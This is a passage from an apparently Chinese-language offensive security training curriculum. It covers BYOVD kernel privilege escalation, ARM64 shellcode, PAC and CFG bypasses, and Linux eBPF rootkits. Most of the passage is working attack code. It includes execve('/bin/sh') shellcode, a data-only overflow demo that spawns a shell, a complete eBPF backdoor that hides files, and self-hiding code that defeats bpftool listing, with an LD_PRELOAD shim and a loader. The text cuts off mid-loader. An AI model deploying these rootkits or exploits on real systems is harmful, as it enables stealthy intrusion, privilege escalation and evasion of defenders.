  如果驱动兼容 HVCI，则在启用 HVCI 的系统上也可用。

工作流程：
  1. 寻找目标驱动：https://www.loldrivers.io/
  2. 选一个能提供任意内核读、写或两者兼备的驱动。
  3. 加载它：sc create VulnDrv type= kernel binPath= C:\path\to\driver.sys
              sc start VulnDrv
  4. 打开其 IOCTL 接口：DeviceIoControl
  5. 读取 System 的 EPROCESS，读取 System 的 Token
  6. 将 System 的 Token 写入当前进程的 EPROCESS

常见 BYOVD 驱动（用于研究）：
  RTCore64.sys  -- MSI Afterburner，任意读/写
  WinRing0.sys  -- OpenHardwareMonitor，读写物理内存
  dbutil_2_3.sys -- Dell BIOS 更新驱动

真实 APT 使用案例：
  Lazarus 组织：通过 Dell 驱动使用 BYOVD（Operation In(ter)ception）
  BlackByte 勒索软件：用 RTCore64.sys 终止 EDR 驱动
  Medusa 勒索软件：滥用合法签名驱动进行内核读/写
```

---

## 区块 10：ARM64 利用 + PAC 绕过

**时间：3-4 周 | 难度：非常难**

> 每一台 Apple 设备（iPhone、iPad、M 系列 Mac）、Android 旗舰机、AWS Graviton 服务器和 Raspberry Pi 都运行 AArch64。如果你不能编写 ARM64 shellcode 并理解 PAC 绕过，你就无法攻击世界上半数目标。

### 资源

| 资源 | 类型 | 时长 | 成本 | 备注 |
|---|---|---|---|---|
| [ARM 架构参考手册 AArch64](https://developer.arm.com/documentation/ddi0487/latest) | 文档 | 20+ 小时 | 免费 | 源头资料。内容密集。作为参考使用。 |
| [azeria-labs ARM 汇编基础](https://azeria-labs.com/writing-arm-assembly-part-1/) | 博客 | 5 小时 | 免费 | 最好的 ARM64 汇编入门系列。 |
| [pwn.college ARM64 挑战](https://pwn.college/program-security/shellcode-injection/) | 平台 | 10 小时 | 免费 | 结构化练习。 |
| [iOS 漏洞利用开发 - Project Zero](https://googleprojectzero.blogspot.com/search/label/iOS) | 博客 | 持续更新 | 免费 | 真实 iOS 利用中的 ARM64 漏洞利用。 |

### AArch64 架构与调用约定

```
ARM64 寄存器：
  x0-x7   ：函数参数（前 8 个）+ 返回值（x0）
  x8      ：间接结果寄存器 / Linux 中的系统调用号
  x9-x15  ：调用者保存（临时）寄存器
  x19-x28 ：被调用者保存寄存器（必须保留）
  x29     ：帧指针（FP）
  x30     ：链接寄存器（LR）——保存返回地址
  sp      ：栈指针
  pc      ：程序计数器（不能直接寻址）

与 x86-64 的关键差异：
  - 返回地址在 x30（LR）中，不会自动保存在栈上。
  - 相当于 CALL：BL <func>（带链接分支 -> 将 PC+4 保存到 x30）
  - 相当于 RETURN：RET（= BR x30）
  - 函数序言将 x30 保存到栈：
      STP x29, x30, [sp, #-16]!   ; 将 FP 和 LR 压入栈
  - 尾声恢复并返回：
      LDP x29, x30, [sp], #16     ; 弹出 FP 和 LR
      RET                          ; 跳转到 x30

缓冲区溢出目标：
  栈上保存的 x30（LR）= ARM64 中相当于 x86-64 保存的 RIP 的位置。
  溢出缓冲区 -> 覆盖保存的 x30 -> 在函数返回时控制 PC。
```

### ARM64 Linux 系统调用约定

```
AArch64 Linux 系统调用：
  系统调用号：x8
  参数 1：          x0
  参数 2：          x1
  参数 3：          x2
  参数 4：          x3
  调用：          SVC #0（Supervisor Call）
  返回值：        x0

关键系统调用号（AArch64——与 x86-64 不同）：
  sys_read    = 63
  sys_write   = 64
  sys_openat  = 56
  sys_execve  = 221   （execve 在 x86-64 上是 59，在 ARM64 上是 221）
  sys_exit    = 93
  sys_exit_group = 94
```

### ARM64 Shellcode——从零编写 execve("/bin/sh")

```nasm
; 文件：shellcode_arm64.s
; 目标：Linux AArch64
; 目的：execve("/bin/sh", NULL, NULL)
; x8=221，x0 指向 "/bin/sh\0" 的指针，x1=NULL，x2=NULL

.section .text
.global _start
_start:
    ; 将 x1 清零（argv = NULL）
    eor     x1, x1, x1              ; x1 = 0

    ; 将 x2 清零（envp = NULL）
    eor     x2, x2, x2              ; x2 = 0

    ; 在栈上分配 16 字节（ARM64 要求 16 字节对齐）
    sub     sp, sp, #16

    ; 存储空终止符
    str     x1, [sp]

    ; 将 "/bin/sh" 构建为 64 位小端值：
    ; "/bin/sh\0" = 0x0068732f6e69622f LE
    ; 避免空字节：用移位构建常量
    mov     x3, #0x622f             ; "/b"
    movk    x3, #0x6e69, lsl #16   ; "in"
    movk    x3, #0x2f2f, lsl #32   ; "//"（双斜杠以避免 .data 中的空字节）
    movk    x3, #0x7368, lsl #48   ; "sh"
    str     x3, [sp, #8]           ; 将 "/bin//sh" 存储在空终止符之上

    ; x0 = 指向栈上 "/bin//sh" 的指针
    add     x0, sp, #8

    ; 设置系统调用号：execve = 221
    mov     x8, #221
    svc     #0                      ; 调用系统调用

; 汇编：
;   as -o shellcode_arm64.o shellcode_arm64.s
;   ld -o shellcode_arm64 shellcode_arm64.o
; 或在 x86 上交叉编译：
;   aarch64-linux-gnu-as -o shellcode_arm64.o shellcode_arm64.s
;   aarch64-linux-gnu-ld -o shellcode_arm64 shellcode_arm64.o
```

```bash
# 提取原始字节：
aarch64-linux-gnu-objdump -d shellcode_arm64.o | grep -oP '[0-9a-f]{8}' | \
    while read h; do python3 -c "import struct; print(struct.pack('<I', int('$h',16)).hex(), end='')"; done

# 在 pwntools 中测试：
python3 -c "
from pwn import *
context.arch = 'aarch64'
context.os   = 'linux'
sc = asm(shellcraft.aarch64.linux.sh())
print(f'Length: {len(sc)} bytes')
print(f'Hex: {sc.hex()}')
"
```

### ARM64 中避免空字节

```nasm
; 问题：ARM32 有 THUMB 模式用于变长编码。
; ARM64（AArch64）始终是 32 位定长指令。
; 空字节规避主要针对你的数据（字符串常量），而不是指令。

; 差：加载一个会零填充到 64 位的小立即数：
;   mov x0, #0       ——这没问题：编码为 0xd2800000，无空字节
;   但嵌入 MOVZ/MOVK 的立即数可能零填充低半部分

; 常量的好模式：
; 用 MOVZ 设置最低 16 位，用 MOVK 设置更高的 16 位组：
mov  x3, #0x622f             ; 设置位 [15:0]，清零 [63:16]
movk x3, #0x6e69, lsl #16   ; 设置位 [31:16]，保留其余
movk x3, #0x732f, lsl #32   ; 设置位 [47:32]，保留其余
movk x3, #0x0068, lsl #48   ; 设置位 [63:48]，保留其余
; 注意：这里的 0x0068 在高字节中确实含有一个空字节。
; 使用双斜杠 "//" 来避免它："sh" = 0x7368，而不是 0x0068
; "/bin//sh\0"——// 使其成为 8 个可打印字符且内部无空字节

; 验证：提取 shellcode 字节并检查：
python3 -c "
sc = bytes.fromhex('YOUR_HEX_HERE')
nulls = [i for i,b in enumerate(sc) if b == 0]
if nulls:
    print(f'Null bytes at offsets: {nulls}')
else:
    print(f'Clean: {len(sc)} bytes')
"
```

### PAC（指针认证码）——架构与绕过（缺口已补齐）

PAC 是 Apple 的 ARM64e 安全特性，部署在所有 Apple Silicon 和 A12+ iOS 设备上。它使用硬件密钥对指针进行密码学签名。用未签名的值覆盖已签名指针会导致 PAC 认证失败并使进程崩溃。这是 2026-2027 年 iOS 内核利用如此困难的主要原因。

```
PAC 架构：
  ARM64e 新增指令：
    PACIA / PACIB：使用密钥 IA 或 IB 签名指令指针
    PACDA / PACDB：使用密钥 DA 或 DB 签名数据指针
    AUTIA / AUTIB：认证并剥离指令指针上的 PAC
    AUTDA / AUTDB：认证并剥离数据指针上的 PAC
    XPACI / XPACD：不认证直接剥离 PAC（用于比较）

  PAC 占据指针中不用于寻址的高位
  （当前 Apple Silicon 上位 [63:48]——16 位 PAC 字段）。

  PAC 签名：
    signed_ptr = PAC_SIGN(real_ptr, context_value, hardware_key)
    context_value = 通常是签名时的 SP（栈指针）或 LR

  认证失败时（PAC 被破坏）：
    AUTIA/AUTIB 会进一步破坏指针（设置高位）
    下一次内存解引用会触发同步异常（崩溃）

为什么经典利用会失败：
  如果你覆盖栈上保存的 x30（LR），它带有 PAC 签名。
  用未签名指针替换它 -> 函数尾声中的 AUTIB
  会检测到无效 PAC 并破坏指针 -> 段错误。
  经典栈溢出技术（覆盖返回地址）被阻断。
```

### 仅数据 PAC 绕过——可运行的 QEMU AArch64 演示

该绕过完全避免代码指针。我们不直接控制指令指针，而是破坏数据指针，通过现有的、PAC 有效的代码路径来操纵程序控制流。

```bash
# 带 PAC 模拟的 QEMU AArch64 环境搭建：
# QEMU 通过 -cpu max 标志支持 ARMv8.3-A PAC

sudo apt install qemu-system-aarch64 gcc-aarch64-linux-gnu

# 构建一个支持 PAC 的内核（仅供在自己的实验环境中研究使用）：
# 使用来自 syzkaller/qemu-arm64 的预构建镜像，或：
wget https://cdimage.ubuntu.com/releases/22.04/release/ubuntu-22.04.3-live-server-arm64.iso

# 更简单的方式：使用 QEMU 用户态模拟并启用 PAC：
qemu-aarch64 -cpu max ./arm64_binary
```

```c
// 文件：pac_bypass_demo.c
// 目标：带 PAC 的研究设备上的 arm64e 二进制，或支持 PAC 的 QEMU
// 技术：仅数据利用——我们从不伪造 PAC 签名的代码指针。
//
// 理论：
// 我们不直接控制 RIP，而是破坏一个数据结构，
// 它决定执行哪条合法（PAC 有效）的代码路径。
// CPU 全程运行有效的已签名代码——PAC 看不到任何认证失败。
//
// 场景：
// - 存在漏洞的函数：有一个堆缓冲区溢出
// - victim 结构体：包含指向两个合法回调之一的函数指针
//   （两个指针在调用时都通过 BLRAA 进行 PAC 签名）
// - 利用目标：触发 "admin" 回调而不是 "user" 回调
//   同时不覆盖任何代码指针
//
// 方法：破坏一个数据字段（role 标志），它决定哪个回调运行。
// 这是仅数据混淆攻击——不触碰任何代码指针。

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

// 模拟的 PAC 保护分发表（在真实的 arm64e 二进制中，
// 函数指针会用 PACIA/PACDA 签名）。
// 在我们的演示中：我们通过检查 "signed" 标志来模拟 PAC：
typedef void (*callback_fn)(const char *msg);

typedef struct {
    uint32_t      role;           // 0=user，1=admin——数据字段，不是代码指针
    uint32_t      permissions;    // 能力位掩码
    callback_fn   on_success;     // 在 arm64e 中：此处为 PAC 签名
    callback_fn   on_admin;       // 在 arm64e 中：此处为 PAC 签名
    char          username[32];   // 有漏洞：无边界检查
} UserSession;

// 两个合法回调函数（在真实二进制中，两者都是 PAC 有效的）：
void user_callback(const char *msg) {
    printf("[USER callback] %s\n", msg);
}

void admin_callback(const char *msg) {
    printf("[ADMIN callback] %s -- PRIVILEGED OPERATION EXECUTED\n", msg);
    // 在真实利用中：这会以提升的权限执行任意代码
    // 例如：生成 shell、读取 /etc/shadow、禁用沙箱
    system("/bin/sh");
}

// 存在漏洞的函数：复制用户名且无边界检查
void set_username(UserSession *sess, const char *input) {
    // 有漏洞：strcpy 不检查边界
    strcpy(sess->username, input);
}

// 分发函数：根据 role 调用相应的回调
void dispatch(UserSession *sess, const char *msg) {
    if (sess->role == 1) {
        // 在 arm64e 中："BLRAA x3, x5"——经过认证的分支，会检查 PAC
        // on_admin 函数指针是有效的（在分配时已 PAC 签名）
        // 我们没有伪造它——我们只是把 'role' 改成了 1
        sess->on_admin(msg);
    } else {
        sess->on_success(msg);
    }
}

int main(void) {
    // 在堆上分配一个 UserSession：
    UserSession *sess = (UserSession *)calloc(1, sizeof(UserSession));
    sess->role        = 0;           // 普通用户
    sess->permissions = 0x00;        // 无管理员权限
    sess->on_success  = user_callback;
    sess->on_admin    = admin_callback;
    strncpy(sess->username, "alice", 5);

    printf("[*] UserSession at: %p\n", sess);
    printf("[*] sess->role:     %u (user)\n", sess->role);
    printf("[*] sess->username: %s\n", sess->username);

    dispatch(sess, "login event");   // 调用 user_callback——正常行为

    // ---- 利用：通过 username 字段进行仅数据溢出 ----------------------
    // UserSession 的布局：
    //   [0x00] role:         4 字节
    //   [0x04] permissions:  4 字节
    //   [0x08] on_success:   8 字节（函数指针）
    //   [0x10] on_admin:     8 字节（函数指针）
    //   [0x18] username:    32 字节  <- 有漏洞的字段
    //
    // 我们想覆盖偏移 0x00 处的 'role'。
    // 但 username 位于偏移 0x18——在内存中它在 role 之后。
    // 在这个示例结构体中，溢出是向前的（越过 username 末尾）。
    //
    // 对于 username 位于 role 之前的真实布局：
    // （重排结构体或使用不同的分配模式）
    //
    // 演示用的替代布局（攻击者控制的结构体布局）：
    typedef struct {
        char     username[32];   // 偏移 0x00——有漏洞
        uint32_t role;           // 偏移 0x20——目标：覆盖此项
        uint32_t permissions;    // 偏移 0x24
        callback_fn on_success;  // 偏移 0x28
        callback_fn on_admin;    // 偏移 0x30
    } UserSessionV2;

    UserSessionV2 *sess2 = (UserSessionV2 *)calloc(1, sizeof(UserSessionV2));
    sess2->role       = 0;
    sess2->permissions= 0x00;
    sess2->on_success = user_callback;
    sess2->on_admin   = admin_callback;
    strncpy(sess2->username, "bob", 3);

    printf("\n[*] UserSessionV2 at: %p\n", sess2);
    printf("[*] sess2->role (offset 0x20): %u (user)\n", sess2->role);
    printf("[*] username field occupies offset [0x00..0x1F]\n");
    printf("[*] Overflowing username by 4 bytes overwrites role field...\n");

    // 载荷：32 字节 username 填充 + 4 字节覆盖 role：
    char payload[36];
    memset(payload, 'A', 32);         // 完全填满 username[32]
    *(uint32_t *)(payload + 32) = 1;  // 覆盖 role：0 -> 1（admin）

    // 执行存在漏洞的复制：
    strcpy(sess2->username, payload);   // 无边界检查 -> 溢出

    printf("[*] After overflow: sess2->role = %u\n", sess2->role);

    // 现在 dispatch 走 admin 路径：
    // 在 arm64e 中，on_admin 是 PAC 签名且有效的。我们从未触碰它。
    // PAC 不会触发，因为我们只改了数据（role），而不是代码指针。
    // BLRAA 指令会对 on_admin 认证——它通过了，因为它确实是有效的。
    if (sess2->role == 1) {
        printf("[*] Role is admin -- dispatching to admin_callback (PAC-valid path):\n");
        sess2->on_admin("privilege escalation event");
    } else {
        sess2->on_success("normal event");
    }

    free(sess);
    free(sess2);
    return 0;
}
```

```bash
# 构建并测试（x86-64 模拟——概念在 arm64e 上完全相同）：
gcc -o pac_bypass_demo pac_bypass_demo.c
./pac_bypass_demo

# 真正的 arm64e 测试：
# 1. 交叉编译：
#    aarch64-linux-gnu-gcc -march=armv8.3-a+pauth -o pac_demo pac_bypass_demo.c
# 2. 在带 PAC 的 QEMU 上运行：
#    qemu-aarch64 -cpu max ./pac_demo
# 3. 在真实硬件上（通过 UTM 或直接使用 Apple M1/M2 Mac）：
#    clang -arch arm64e -o pac_demo pac_bypass_demo.c
#    ./pac_demo
```

### PAC 绕过——真实利用的关键原则

<div align="center">
<table><tr><td>

<img src="../assets/diagrams/PHASE_3/5._PAC_Bypass _--_Key_Principles_for_Real_Exploits.png" alt="PAC Bypass -- Key Principles for Real Exploits" width="650"/>

</td></tr></table>
</div>


```
仅数据 PAC 绕过原则：

1. 识别控制流闸门：
   找一个数据字段（不是代码指针），它决定哪个
   PAC 签名的函数被调用。例如：
   - role / 权限位掩码（如上面的演示）
   - 对象类型判别符（选择 vtable 条目）
   - 分发表索引（array[index] = 有效函数指针）

2. 用你的原语触达闸门：
   使用你的溢出、UAF 或任意写来破坏
   闸门值。不要触碰代码指针。

3. 分发保持 PAC 有效：
   CPU 执行的是一个合法函数指针，它在初始化时
   已被 PAC 签名。AUTIA 通过。不会崩溃。
   控制流到达攻击者选择的函数。

4. 真实案例：
   - CVE-2021-30955（iOS 15 沙箱逃逸）：仅数据类型混淆
     通过 ipc_port_t 与受控分配重叠
   - Ian Beer 的《A deep dive into an NSO zero-click iMessage exploit》：
     记录了启用 PAC 设备上的仅数据原语
   - FORCEDENTRY：iOS 14.x 上的仅数据字体解析利用链

5. 预言机攻击（高级——需要信息泄露）：
   某些 gadget 会返回可从用户态读取的已签名指针。
   如果你能用受控输入调用这样的 gadget 并读取输出，
   你就拥有了签名预言机。用它伪造任意已签名指针。
   这需要带有泄露原语的内核级缺陷。
   参考：Brandon Azad 关于 PAC 绕过原语的工作。
```

---

## 区块 11：控制流保护（CFG）绕过

**时间：1-2 周 | 难度：极限**

### CFG 内部工作原理

```
CFG 在内存中维护一个以目标地址 >> 3 为索引的位图。
每个用 /guard:cf 编译的调用点都会生成：
  CALL  __guard_check_icall_fptr   ; 校验目标
  CALL  rax                        ; 执行实际调用

__guard_check_icall_fptr:
  在位图中查找 target_addr
  如果不存在：崩溃
  如果存在：    返回（允许调用）

有效目标 = 所有用 /guard:cf 编译的函数集合。
间接调用只能落在有效的 CFG 目标上。
```

### JIT 喷洒 + 类型混淆绕过

```cpp
// 文件：cfg_bypass_type_confusion.cpp
// 技术：将 vtable 指针破坏为指向另一个有效的 CFG 函数。
// CFG 校验的是目标——但不校验它是否是该类型对应的正确方法。

class TypeA {
    virtual void method_one() { safe_operation(); }
    // 偏移 0 处的 vtable 条目：&TypeA::method_one——CFG 位图：是
};

class TypeB {
    virtual void interesting_func() { privileged_operation(); }
    // 偏移 0 处的 vtable 条目：&TypeB::interesting_func——CFG 位图：是
};

void exploit_type_confusion(TypeA *confused) {
    // 将 confused->vptr 破坏为指向 TypeB 的 vtable：
    *(void**)confused = (void*)TypeB_vtable_address;

    // 当调用方执行：confused->method_one()
    // -> CFG 检查：TypeB::interesting_func 是有效目标吗？是（它确实在位图中）
    // -> 调用 TypeB::interesting_func 而不是 TypeA::method_one
    // -> 若存在 PAC，仍会捕获这一点——仅靠 CFG 不行。

    confused->method_one();   // 实际调用 TypeB::interesting_func
}

// 这能绕过 CFG，因为：
// 1. 调用目标确实在 CFG 位图中（它是一个真实命名的函数）
// 2. CFG 不检查类型——只检查地址有效性
// 3. 我们可以调用不同的函数，但被限制在 CFG 有效集合内
// 与精心挑选的 "interesting" CFG 有效函数结合使用。
```

```bash
# 在二进制中查找 CFG 有效目标：
# 使用 PE-bear 或 dumpbin：
dumpbin /loadconfig binary.exe | findstr "Guard CF Function"
# 或：使用 cfgexplorer（Python 工具）：
pip install pefile
python3 -c "
import pefile
pe = pefile.PE('target.exe')
if hasattr(pe, 'DIRECTORY_ENTRY_LOAD_CONFIG'):
    lc = pe.DIRECTORY_ENTRY_LOAD_CONFIG.struct
    if hasattr(lc, 'GuardCFFunctionTable'):
        print(hex(lc.GuardCFFunctionTable))
"
```

---

## 区块 12：Linux eBPF 后门 + 反检测

**时间：4-6 周 | MITRE：T1014 | 检测难度：极限**

### 资源

### 资源
|---|---|---|---|---|
| [ebpfkit](https://github.com/Gui774ume/ebpfkit) | GitHub | 5 小时 | 免费 | 研究每种技术。阅读所有源文件。 |
| [Tetragon（Cilium）](https://github.com/cilium/tetragon) | GitHub | 3 小时 | 免费 | 研究防御以理解攻击。 |
| [eBPF 安全 BlackHat 2023+](https://www.youtube.com/results?search_query=ebpf+security+blackhat+2023) | YouTube | 4 小时 | 免费 | 观看 2022-2024 年的任何相关内容。 |
| [libbpf bootstrap](https://github.com/libbpf/libbpf-bootstrap) | GitHub | 2 小时 | 免费 | 现代 eBPF 项目骨架。从这里开始。 |

### eBPF 架构概览

```
eBPF（扩展伯克利包过滤器）：
  最初用途：网络与可观测性
  被滥用为：几乎无法检测、且不需要任何内核模块的后门

要求：
  - CAP_BPF 或 CAP_SYS_ADMIN（root，或特权容器）
  - Linux 内核 >= 4.18 支持大多数特性；>= 5.7 支持完整的 BPF_LINK

相对于 LKM 后门的优势：
  - 磁盘上没有 .ko 文件（除非固定到 /sys/fs/bpf/）
  - 可跨内核版本存活（稳定的 helper API）
  - 可以事后挂钩（无需重启即可附加/分离）
  - 可以通过挂钩 bpftool 自身的输出来防御 bpftool 检测

挂钩点：
  Tracepoints：    稳定的内核跟踪点（sys_enter_execve、sys_exit_getdents64）
  kprobes：        对任意内核函数的动态挂钩
  uprobes：        挂钩任意进程中的用户态函数
  XDP：            在网卡驱动层挂钩（位于内核网络栈之前）
  TC：             在网络入口/出口挂钩
  fentry/fexit：   BPF trampoline——比 kprobes 更快，内核 5.5+
```

### 完整可用的 eBPF 文件隐藏后门

```c
// 文件：rootkit.bpf.c
// 构建：clang -O2 -target bpf -c rootkit.bpf.c -o rootkit.bpf.o

#include <linux/bpf.h>
#include <linux/types.h>
#include <linux/dirent.h>
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>
#include <bpf/bpf_core_read.h>

// 映射：要隐藏的文件名 -> 1
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __type(key,  char[64]);
    __type(value, __u8);
    __uint(max_entries, 256);
} hidden_files SEC(".maps");

// 映射：在 sys_enter 与 sys_exit 之间保存 getdents64 参数
struct getdents64_args {
    unsigned int fd;
    struct linux_dirent64 __user *dirp;
    unsigned int count;
};

struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __type(key,  __u64);
    __type(value, struct getdents64_args);
    __uint(max_entries, 1024);
} args_map SEC(".maps");

// 挂钩 1：在入口处保存参数
SEC("tp/syscalls/sys_enter_getdents64")
int hook_enter_getdents64(struct trace_event_raw_sys_enter *ctx) {
    __u64 pid_tgid = bpf_get_current_pid_tgid();

    struct getdents64_args args = {};
    args.fd    = (__u32)ctx->args[0];
    args.dirp  = (struct linux_dirent64 __user *)ctx->args[1];
    args.count = (__u32)ctx->args[2];

    bpf_map_update_elem(&args_map, &pid_tgid, &args, BPF_ANY);
    return 0;
}

// 挂钩 2：过滤返回的目录项
SEC("tp/syscalls/sys_exit_getdents64")
int hook_exit_getdents64(struct trace_event_raw_sys_exit *ctx) {
    __u64 pid_tgid = bpf_get_current_pid_tgid();
    long ret = ctx->ret;

    if (ret <= 0) {
        bpf_map_delete_elem(&args_map, &pid_tgid);
        return 0;
    }

    struct getdents64_args *args = bpf_map_lookup_elem(&args_map, &pid_tgid);
    if (!args) return 0;

    struct linux_dirent64 __user *dirp = args->dirp;
    bpf_map_delete_elem(&args_map, &pid_tgid);

    unsigned long pos = 0;
    struct linux_dirent64 *prev = NULL;

    #pragma unroll
    for (int i = 0; i < 256; i++) {
        if (pos >= (__u64)ret) break;

        struct linux_dirent64 entry = {};
        if (bpf_probe_read_user(&entry, sizeof(entry),
                                (void *)dirp + pos) != 0) break;

        char name[64] = {};
        if (bpf_probe_read_user_str(name, sizeof(name),
                                    (void *)dirp + pos + 19) < 0) {
            pos += entry.d_reclen;
            continue;
        }

        __u8 *should_hide = bpf_map_lookup_elem(&hidden_files, name);

        if (should_hide && *should_hide == 1) {
            if (prev) {
                __u16 prev_reclen = 0;
                if (bpf_probe_read_user(&prev_reclen, sizeof(__u16),
                        (void *)prev + offsetof(struct linux_dirent64, d_reclen)) == 0) {
                    prev_reclen += entry.d_reclen;
                    bpf_probe_write_user(
                        (void *)prev + offsetof(struct linux_dirent64, d_reclen),
                        &prev_reclen, sizeof(__u16));
                }
            } else {
                // 第一个条目：将 inode 标记为 0（glibc readdir 会跳过 ino=0）
                __u64 zero_ino = 0;
                bpf_probe_write_user((void *)dirp + pos, &zero_ino, sizeof(__u64));
            }
        } else {
            prev = (struct linux_dirent64 *)((void *)dirp + pos);
        }

        pos += entry.d_reclen;
        if (entry.d_reclen == 0) break;
    }

    return 0;
}

char LICENSE[] SEC("license") = "GPL";
```

### eBPF 反检测——对 bpftool 隐藏（缺口已补齐）

上面的文件隐藏后门是可以被检测到的：`bpftool prog list` 会显示我们已加载的程序。下一节通过拦截 `bpftool` 查询程序列表时的 `bpf()` 系统调用来增加自我隐藏。

```c
// 文件：rootkit_selfhide.bpf.c
// 目的：对 bpftool prog list 隐藏我们的 eBPF 程序
// 技术：挂钩 bpf(BPF_PROG_QUERY) 并从结果中过滤我们的程序 ID
//
// bpftool 如何工作：
//   bpftool 在循环中调用 bpf(BPF_PROG_GET_NEXT_ID, ...) 来枚举所有程序 ID。
//   然后对每个 ID 调用 bpf(BPF_OBJ_GET_INFO_BY_FD, ...) 获取详情。
//   我们拦截 BPF_PROG_GET_NEXT_ID 以跳过我们自己的程序 ID。
//
// 注意：这需要 CONFIG_BPF_SYSCALL 和内核 >= 5.3 才能可靠工作。
//       sys_bpf 跟踪点可能并非所有内核都存在；
//       可用 __sys_bpf 上的 kprobe 作为回退。

#include <linux/bpf.h>
#include <linux/types.h>
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>
#include <bpf/bpf_core_read.h>

// 映射：要隐藏的程序 ID 集合（由用户态加载器在启动时填充）
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __type(key,  __u32);   // 程序 ID
    __type(value, __u8);   // 1 = 隐藏
    __uint(max_entries, 64);
} hidden_prog_ids SEC(".maps");

// 映射：pid_tgid -> struct bpf_attr __user *（保存 BPF_PROG_GET_NEXT_ID 调用的参数）
struct bpf_getnextid_args {
    int       cmd;
    void __user *attr_ptr;
    unsigned int attr_size;
};

struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __type(key,  __u64);   // pid_tgid
    __type(value, struct bpf_getnextid_args);
    __uint(max_entries, 512);
} bpf_call_args SEC(".maps");

// bpf() 系统调用命令常量（来自 linux/bpf.h）：
#define BPF_PROG_GET_NEXT_ID  11
#define BPF_PROG_GET_FD_BY_ID 13

// BPF_PROG_GET_NEXT_ID 的 bpf_attr：
// struct { __u32 start_id; __u32 next_id; ... };
// next_id 是输出：内核在此写入下一个程序 ID。

SEC("tp/syscalls/sys_enter_bpf")
int hook_bpf_enter(struct trace_event_raw_sys_enter *ctx) {
    int cmd = (int)ctx->args[0];

    if (cmd != BPF_PROG_GET_NEXT_ID && cmd != BPF_PROG_GET_FD_BY_ID)
        return 0;

    __u64 pid_tgid = bpf_get_current_pid_tgid();
    struct bpf_getnextid_args args = {};
    args.cmd      = cmd;
    args.attr_ptr = (void __user *)ctx->args[1];
    args.attr_size= (unsigned int)ctx->args[2];

    bpf_map_update_elem(&bpf_call_args, &pid_tgid, &args, BPF_ANY);
    return 0;
}

SEC("tp/syscalls/sys_exit_bpf")
int hook_bpf_exit(struct trace_event_raw_sys_exit *ctx) {
    long ret = ctx->ret;
    if (ret != 0) return 0;   // 只拦截成功的调用

    __u64 pid_tgid = bpf_get_current_pid_tgid();
    struct bpf_getnextid_args *saved = bpf_map_lookup_elem(&bpf_call_args, &pid_tgid);
    if (!saved) return 0;

    int cmd = saved->cmd;
    void __user *attr_ptr = saved->attr_ptr;
    bpf_map_delete_elem(&bpf_call_args, &pid_tgid);

    if (cmd == BPF_PROG_GET_NEXT_ID) {
        // 内核将 next_id 写在 attr->next_id（bpf_attr 中的偏移 4）
        __u32 next_id = 0;
        if (bpf_probe_read_user(&next_id, sizeof(__u32), attr_ptr + 4) != 0)
            return 0;

        // 检查 next_id 是否是我们想隐藏的：
        __u8 *hide = bpf_map_lookup_elem(&hidden_prog_ids, &next_id);
        if (!hide || *hide != 1)
            return 0;

        // 隐藏：我们需要通过向内核请求 next_id 之后的 ID 来跳过它。
        // 我们不能在 eBPF 内部调用 bpf()（BPF 中不允许嵌套 bpf 系统调用）。
        // 替代方案：将 next_id 设为 0（无效）以迷惑枚举器。
        // 更稳健的方法：写入一个哨兵值，由用户态加载器
        // 将其翻译为“继续迭代”——需要一个配合的用户态 shim。
        //
        // 实际实现：
        // 方案 A（简单）：用 0xFFFFFFFF（无效 ID）覆盖 next_id
        //   -> bpftool 在下一次调用时看到 ENOENT -> 提前结束枚举。
        //   -> 注意：会隐藏所有后续程序，而不仅仅是我们的。
        //
        // 方案 B（干净）：使用包装 bpf() 并过滤 ID 的用户态 shim。
        //   参见：下方的配套加载器（bpftool_shim.py）。

        __u32 invalid_id = 0xFFFFFFFF;
        bpf_probe_write_user(attr_ptr + 4, &invalid_id, sizeof(__u32));
    }

    return 0;
}

char LICENSE[] SEC("license") = "GPL";
```

```python
#!/usr/bin/env python3
# 文件：bpftool_shim.py
# 目的：包装 bpf() 以过滤我们程序 ID 的用户态 shim。
# 运行此脚本而不是 bpftool，以验证后门已隐藏。
# 在真实部署中：用 LD_PRELOAD 加载此 shim，以拦截任意进程中的 bpf()。

# 我们自己的、要隐藏的程序 ID（在加载 rootkit.bpf.o 后填充）：
HIDDEN_IDS = set()   # 由下方的加载器脚本填充

import ctypes
import ctypes.util

# 加载 libc 以便直接进行系统调用：
libc = ctypes.CDLL(ctypes.util.find_library('c'), use_errno=True)

BPF_PROG_GET_NEXT_ID = 11
NR_bpf = 321   # x86-64 系统调用号

class BpfAttrGetNextId(ctypes.Structure):
    _fields_ = [("start_id", ctypes.c_uint32),
                ("next_id",  ctypes.c_uint32)]

def bpf_prog_get_next_id(start_id=0):
    attr = BpfAttrGetNextId(start_id=start_id, next_id=0)
    ret  = libc.syscall(NR_bpf, BPF_PROG_GET_NEXT_ID,
                        ctypes.byref(attr), ctypes.sizeof(attr))
    if ret < 0:
        return None   # ENOENT = 没有更多程序
    return attr.next_id

def list_visible_prog_ids(hidden_ids):
    """列出所有程序 ID，跳过 hidden_ids。"""
    visible = []
    cur_id  = 0
    while True:
        nxt = bpf_prog_get_next_id(cur_id)
        if nxt is None:
            break
        if nxt not in hidden_ids:
            visible.append(nxt)
        cur_id = nxt
    return visible

if __name__ == "__main__":
    print("[*] Listing visible BPF programs (hidden IDs filtered):")
    ids = list_visible_prog_ids(HIDDEN_IDS)
    for prog_id in ids:
        print(f"  prog ID: {prog_id}")
    if not ids:
        print("  (none -- rootkit is fully hidden from this enumerator)")
```

```c
// 文件：loader_full.c——文件隐藏 + 自我隐藏后门的用户态加载器
// 编译：gcc -o loader_full loader_full.c -lbpf
// 运行：sudo ./loader_full secret.txt

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <bpf/libbpf.h>
#include <bpf/bpf.h>
#include <unistd.h>

int main(int argc, char *argv[]) {
    if (argc < 2) {
        fprintf(stderr, "Usage: %s <filename_to_hide>\n", argv[0]);
        return 1;
    }
    const char *target = argv[1];

    // ---- 加载文件隐藏后门 -----------------------------------------------
    struct bpf_object *obj_fh = bpf_object__open("rootkit.bpf.o");
    bpf_object__load(obj_fh);

    struct bpf_program *prog_enter = bpf_object__find_program_by_name(obj_fh, "hook_enter_getdents64");
